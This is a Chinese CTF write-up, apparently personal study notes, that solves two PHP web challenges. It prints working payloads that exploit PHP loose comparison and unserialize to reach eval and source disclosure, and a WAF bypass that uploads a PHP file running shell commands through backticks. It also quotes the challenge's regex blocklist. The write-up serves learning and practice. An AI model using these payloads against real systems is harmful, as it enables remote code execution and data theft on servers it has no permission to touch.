---
title: 第三次nep笔记
---

## 总结比赛的两道web题

## web1

![](https://zhuang-yongyi.gitee.io/yoyo/%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AF/10.png)

首先要使$login=true，想到的是md5弱类型比较，查看str_shuffle函数的用法，是随机地打乱字符串中的所有字符。如果是md5加密绕过的话，想到的是0e开头绕过和传入数组绕过。但是str_shuffle打乱之后这两种思路都行不通。试图查看str_shuffle函数有没有漏洞，没有找到。

接下来继续观察， $unserialize_str这个函数是可控的，它与$username弱类型比较的值要为真，而$username是不可控的，查看弱类型比较还有什么可以利用的地方，发现可以利用0与字符串弱类型比较的结果也为0（这里要注意的是，第一个字符不能为数字），到这里就清楚了，md5在这里就是混淆视线的，我们可以把$username，$password视为随机值。

那么接下来要思考的是，怎样让$unserialize_str['username']和$unserialize_str['password']的值为0

注意到 unserialize函数，想到反序列化漏洞，但是在反序列化漏洞中没有找到可以利用的地方。

还是继续从弱类型比较入手，PHP弱类型 - 简书  https://www.jianshu.com/p/90d235d4f745

在这篇文章中找到

![](https://zhuang-yongyi.gitee.io/yoyo/%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AF/13.png)

这里的json_decode函数让我联想到了unserialize函数，都是可以触发反序列化漏洞的函数。

这里的payload为 item={"key":0}，尝试构造这到题的payload，没有成功。

![](https://zhuang-yongyi.gitee.io/yoyo/%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AF/14.png)

继续找弱类型，发现这篇文章，ctf常见php弱类型分析_词语大杂烩-CSDN博客_ctf弱类型  https://blog.csdn.net/qq3401247010/article/details/77867399

![](https://zhuang-yongyi.gitee.io/yoyo/%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AF/15.png)

发现这道题的payload用的是数组的方法，unserialize函数在数组中不会报错。

![](https://zhuang-yongyi.gitee.io/yoyo/%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AF/16.png)

![](https://zhuang-yongyi.gitee.io/yoyo/%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AF/11.png)

接着绕过正则，https://blog.csdn.net/silence1_/article/details/102835743参考了这篇文章，构造payload

```
?str=a:2:{s:8:%22username%22;i:0;s:8:%22password%22;i:0;}&code=eval(end(current(get_defined_vars())));&b=var_dump(highlight_file(end(scandir(pos(localeconv())))));
```

![](https://zhuang-yongyi.gitee.io/yoyo/%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AF/12.png)

看了wp发现，这道题还有更好的解法，由于php是弱类型语⾔，所以bool值为true的变量和任何变量⽐较都相等，除了0和false

![](https://zhuang-yongyi.gitee.io/yoyo/%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AF/24.png)

这样，我们构造的payload就不会跟第一个种解法一样具有不确定性

wp还给出了利用三角函数构造点

查看php版本

```php
?str=a:2:{s:8:"username";b:1;s:8:"password";b:1;}&code=phpinfo();
```

版本号为： 7.2.24

phpversion() 返回 7.2.24-0ubuntu0.18.04.7

```php
floor(phpversion()) 返回 7

sin(floor(phpversion())) 返回 0.65698659871879sin(sin(floor(phpversion()))) 返回 0.61073350824527

cos(sin(sin(floor(phpversion())))) 返回 0.81922759437835

rad2deg(cos(sin(sin(floor(phpversion()))))) 返回 46.938283618535

floor(rad2deg(cos(sin(sin(floor(phpversion())))))) 返回 46
```

这样便构造出 46 了

返回

flag在 this_is_flag.php 中，刚好在最后⼀个⽂件，通过 end() 读取最后⼀个⽂件，再通过

show_source() 打印，这样就得到最终的payload：

```php
?str=a:2:
{s:8:"username";b:1;s:8:"password";b:1;}&code=show_source(end(scandir(chr(floor
(rad2deg(cos(sin(sin(floor(phpversion()))))))))));
```

```php
php 5.x
?
code=var_dump(scandir(chr(floor(rad2deg(sin(cos(cos(floor(phpversion())))))))))
;?
code=show_source(end(scandir(chr(floor(rad2deg(sin(cos(cos(floor(phpversion()))
))))))))
```

## web2

```php
<?
$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
if(!file_exists($dir)){
    mkdir($dir);
}
switch($_GET["action"] ?? "") {
    case 'pwd':
        echo $dir;
        break;
    case 'upload':
        $data = $_GET["data"] ?? "";
        waf($data);
        file_put_contents("$dir" . "index.php", $data);
}
?>
```

$_SERVER["REMOTE_ADDR"] 为获取'获取IP

$a ?? 0 等同于 isset($a) ? $a : 0

$a ?: 0 等同于 $a ? $a : 0

可得$_GET["action"] ?? "" 等同于isset($attion) ? $attion : ""

我们的目的就是要让$action='upload',执行file_put_contents函数

$dir并不是我们能控制的，也就是file_put_contents函数打开的文件路径是固定的，这里我在本地测试的时候遇到一个问题，文件名中不能含有'/'

![](https://zhuang-yongyi.gitee.io/yoyo/%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AF/17.png)

既然名不能有'/',我一开始想到的是注释，但是行不通，然后是文件流，base64编码，但是由于$dir不是我们能控制的，所以都行不通。接着发现mkdir函数在创建文件目录或文件是也不能有'/'等特殊符号，如何存在'/'，'/'前面会被当成创建文件目录处理。而这道题中刚好有有mkdir函数`if(!file_exists($dir)){ mkdir($dir);}`

只要执行mkdir函数，file_put_contents函数打开的文件路径就不会报错了。

这道题还需要注意，在本地测试ip地址是127.0.0.1，而这道题不是，所以在本地和这道题产生的文件名是不一样的，这道题的文件名可以通过让$action=pwd,打印出$dir,也就是file_put_contents函数打开的文件路径。

接下来考虑的是$data变量，因为file_put_contents函数打开的文件后缀为php，也就是如果$data为输入php格式，可以执行php代码。

这里 waf($data)调用了两个函数

```php
 error_reporting(0);
highlight_file(__FILE__);
function check($input){
    if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
        // if(preg_match("/'| |_|=|php/",$input)){
        die('hacker!!!');
    }else{
        return $input;
    }
}

function waf($input){
  if(is_array($input)){
      foreach($input as $key=>$output){
          $input[$key] = waf($output);
      }
  }else{
      $input = check($input);
  }
}
```

isArray() 方法用于判断一个对象是否为数组。如果对象是数组返回 true，否则返回 false。我们刚才分析$data的内容应该是php文件的格式，所以不会是一个数组。观察 check方法

![](https://zhuang-yongyi.gitee.io/yoyo/%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AF/19.png)

php被过滤，我们可以采用短标签的格式，`<?=  ?>`

到这里一开始的想法是构造一句话木马，但是这些符号被过滤了，构造失败

```
_  ^  ~  ;  { }
```

然后发现反引号没有被过滤，可以构造<?= %09`dir`?>

![](https://zhuang-yongyi.gitee.io/yoyo/%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AF/20.png)

这里空格被过滤，用%09代替。

这里当前目录只有index.php,一开始的想法是通过返回上级目录查看内容，也就是`cd%09..&&ls`,但发现没有执行成功，最后是通过返回根目录

![](https://zhuang-yongyi.gitee.io/yoyo/%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AF/21.png)

可以看出最后xxxaf14gss.php即为我们想找的文件，cat  /xxxaf14gss.php，php被过滤，用*绕过

![](https://zhuang-yongyi.gitee.io/yoyo/%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AF/22.png)

